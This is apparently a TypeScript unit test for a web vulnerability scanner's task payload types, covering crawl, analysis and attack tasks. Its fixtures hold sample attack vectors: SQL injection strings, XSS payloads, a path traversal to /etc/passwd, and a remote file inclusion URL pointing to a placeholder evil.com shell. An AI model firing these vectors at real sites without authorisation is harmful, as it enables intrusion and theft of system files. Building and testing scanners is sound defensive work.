import { TaskPayloadMap } from "../core/TaskPayloadMap";
import { TaskType } from "../core/TaskType";

describe("TaskPayloadMap", () => {
  it("accepte les bons payloads pour chaque TaskType", () => {
    const page: TaskPayloadMap[TaskType.CRAWL_PAGE] = {
      url: "https://test.com",
    };

    const assets: TaskPayloadMap[TaskType.CRAWL_ASSETS] = {
      url: "https://test.com",
      includeJS: true,
    };

    const form: TaskPayloadMap[TaskType.CRAWL_FORM] = {
      url: "https://test.com",
      method: "POST",
    };

    const api: TaskPayloadMap[TaskType.CRAWL_API] = {
      baseUrl: "https://api.test.com",
      headers: { Authorization: "Bearer token" },
      depth: 1,
    };

    const analyzeHttp: TaskPayloadMap[TaskType.ANALYZE_HTTP] = {
      url: "https://test.com",
      method: "GET",
      headers: {},
      body: "",
      query: {},
      response: { status: 200, headers: {}, body: "" },
    };

    const analyzeDom: TaskPayloadMap[TaskType.ANALYZE_DOM] = {
      url: "https://test.com/app.js",
      code: "console.log('hello');",
      isInline: false,
      metadata: { size: 1234 },
    };

    const sqliTime: TaskPayloadMap[TaskType.ATTACK_SQLI_TIME] = {
      url: "https://test.com",
      method: "GET",
      headers: {},
      body: {},
      query: {},
      vector: "' OR SLEEP(5)--",
      delay: 5,
    };

    const sqliError: TaskPayloadMap[TaskType.ATTACK_SQLI_ERROR] = {
      url: "https://test.com",
      method: "GET",
      headers: {},
      body: {},
      query: {},
      vector: "' OR 1=1--",
      errorSignature: "SQL syntax error",
    };

    const xssReflected: TaskPayloadMap[TaskType.ATTACK_XSS_REFLECTED] = {
      url: "https://test.com",
      method: "GET",
      headers: {},
      body: {},
      query: {},
      vector: "<script>alert(1)</script>",
      marker: "XSS_MARKER",
    };

    const xssStored: TaskPayloadMap[TaskType.ATTACK_XSS_STORED] = {
      url: "https://test.com",
      method: "POST",
      headers: {},
      body: {},
      query: {},
      vector: "<img src=x onerror=alert(1)>",
    };

    const lfi: TaskPayloadMap[TaskType.ATTACK_LFI] = {
      url: "https://test.com",
      method: "GET",
      headers: {},
      body: {},
      query: {},
      vector: "../../etc/passwd",
      filePath: "/etc/passwd",
    };

    const rfi: TaskPayloadMap[TaskType.ATTACK_RFI] = {
      url: "https://test.com",
      method: "GET",
      headers: {},
      body: {},
      query: {},
      vector: "http://evil.com/shell.txt",
      remoteUrl: "http://evil.com/shell.txt",
    };

    const normalizeAttack: TaskPayloadMap[TaskType.NORMALIZE_ATTACK] = {
      rawFindings: [],
      context: {},
    };
    const normalizeContext: TaskPayloadMap[TaskType.NORMALIZE_CONTEXT] = {
      context: {},
    };

    const normalizeAssets: TaskPayloadMap[TaskType.NORMALIZE_ASSETS] = {
      rawAssets: [],
      context: {},
    };

    expect(page.url).toBe("https://test.com");
  });

  it("rejette un mauvais payload pour un TaskType", () => {
    // @ts-expect-error
    const wrong: TaskPayloadMap["crawl:page"] = { method: "POST" };

    // @ts-expect-error
    const wrong2: TaskPayloadMap["attack:sqli:time"] = { url: 123 };

    // @ts-expect-error
    const wrongNormAssets: TaskPayloadMap["normalize:assets"] = { foo: "bar" };

    expect(true).toBe(true);
  });
});
